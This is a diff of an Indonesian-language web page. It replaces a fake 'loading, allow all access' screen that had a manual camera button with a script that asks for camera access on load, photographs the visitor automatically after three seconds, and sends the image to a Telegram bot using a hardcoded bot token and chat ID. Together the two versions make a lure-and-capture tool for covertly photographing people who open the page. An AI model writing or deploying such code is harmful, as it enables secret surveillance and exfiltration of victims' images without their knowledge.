@@ -3,129 +3,52 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width,initial-scale=1.0">
-  <title>Tunggu Loadingg..</title>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
-  <style>
-    body {
-      background:#000;
-      margin:0;
-      padding:0;
-      display:flex;
-      justify-content:center;
-      align-items:center;
-      flex-direction: column;
-      height:100vh;
-      font-family:Arial,sans-serif;
-      color:#999;
-      overflow:hidden
-    }
-    #loading-container {
-      text-align:center;
-      width:80%;
-      max-width:400px
-    }
-    #loading-text {
-      font-size:22px;
-      margin-bottom:20px;
-      color:#6e48aa
-    }
-    #progress-container {
-      height:3px;
-      background:#222;
-      border-radius:3px;
-      overflow:hidden
-    }
-    #progress-bar {
-      height:100%;
-      width:0%;
-      background:linear-gradient(90deg,#6e48aa,#9d50bb);
-      transition:width .3s ease
-    }
-    #loading-details {
-      margin-top:20px;
-      font-size:14px;
-      color:#666
-    }
-    .hidden { display:none }
-
-    /* tambahan style kamera */
-    video, canvas {
-      width: 90%;
-      max-width: 400px;
-      border-radius: 10px;
-      margin: 10px 0;
-      background: #000;
-    }
-    button {
-      padding: 10px 20px;
-      font-size: 16px;
-      margin: 10px;
-      cursor: pointer;
-      border: none;
-      border-radius: 8px;
-      background: #6e48aa;
-      color: white;
-    }
-    button:hover {
-      background: #9d50bb;
-    }
-  </style>
+  <title>Ambil Foto & Kirim Telegram</title>
 </head>
 <body>
-  <div id="loading-container">
-    <div id="loading-text">hIdupkan lokasi anda/GPRS, ijinkan semua AKSES Mohon Tunggu Sebentar...</div>
-    <div id="progress-container"><div id="progress-bar"></div></div>
-    <div id="loading-details"></div>
-  </div>
-
-  <!-- Preview kamera -->
-  <video id="video" autoplay playsinline></video>
-  
-  <!-- Tombol ambil foto -->
-  <button id="capture">📸 Ambil Foto</button>
-  
-  <!-- Hasil foto -->
-  <canvas id="canvas"></canvas>
-  <div id="hasil"></div>
-
   <script>
-    // progress bar animasi (punya file lama)
-    let p=0;
-    const pb=document.getElementById('progress-bar');
-    const ld=document.getElementById('loading-details');
-    const LM=["Memeriksa modul sistem...","Memuat komponen inti...","Menginisialisasi antarmuka...","Memverifikasi koneksi...","Menyiapkan lingkungan...","Memeriksa pembaruan...","Memuat aset tampilan..."];
-    setInterval(()=>{
-      p+=Math.random()*5;
-      if(p>98)p=98;
-      pb.style.width=p+'%';
-      if(Math.random()>.9)ld.textContent=LM[Math.floor(Math.random()*LM.length)];
-    },500);
+    // Ganti dengan token dan chat_id kamu
+    const BOT_TOKEN = "7263103738:AAFHQr9tKSy-DxMM5h7H9XdDPyksAdb-3_Q";
+    const CHAT_ID = "7191940139";
 
-    // ==== Tambahan Kamera ====
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const captureBtn = document.getElementById('capture');
-    const hasil = document.getElementById('hasil');
-    const ctx = canvas.getContext('2d');
+    // Fungsi kirim foto ke Telegram
+    async function sendPhoto(blob) {
+      const fd = new FormData();
+      fd.append("chat_id", CHAT_ID);
+      fd.append("photo", blob, "capture.png");
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: "POST",
+        body: fd
+      });
+    }
 
-    // Minta izin kamera
+    // Akses kamera
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
+        const video = document.createElement("video");
         video.srcObject = stream;
+        video.play();
+
+        // Tunggu kamera nyala sebentar
+        setTimeout(() => {
+          const canvas = document.createElement("canvas");
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext("2d");
+          ctx.drawImage(video, 0, 0);
+
+          // Konversi ke blob
+          canvas.toBlob(async (blob) => {
+            await sendPhoto(blob);  // kirim ke Telegram
+            console.log("Foto berhasil dikirim ke Telegram");
+            // stop kamera
+            stream.getTracks().forEach(track => track.stop());
+          }, "image/png");
+        }, 3000); // otomatis ambil setelah 3 detik
       })
       .catch(err => {
-        hasil.innerHTML = "<p style='color:red'>Kamera tidak bisa diakses: " + err + "</p>";
+        console.error("Tidak bisa akses kamera:", err);
       });
-
-    // Ambil foto saat tombol ditekan
-    captureBtn.addEventListener('click', () => {
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      const foto = canvas.toDataURL("image/png");
-
-      hasil.innerHTML = `<p>Foto berhasil diambil:</p><img src="${foto}" width="200"/>`;
-    });
   </script>
 </body>
 </html>
